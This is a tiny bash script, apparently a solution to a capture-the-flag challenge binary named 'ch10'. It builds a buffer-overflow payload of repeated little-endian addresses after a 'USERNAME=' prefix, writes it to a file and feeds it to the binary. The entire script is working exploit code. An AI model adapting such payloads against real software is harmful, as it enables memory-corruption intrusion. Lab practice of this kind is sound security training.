#!/bin/bash

# Need address of $esi for fgets to not segfault

python -c 'print "USERNAME=" + "\x08\x04\xb0\x08"[::-1]*(42) + "\xbf\xff\xfe\x0f"[::-1]' > $WIP/file
./ch10 $WIP/file
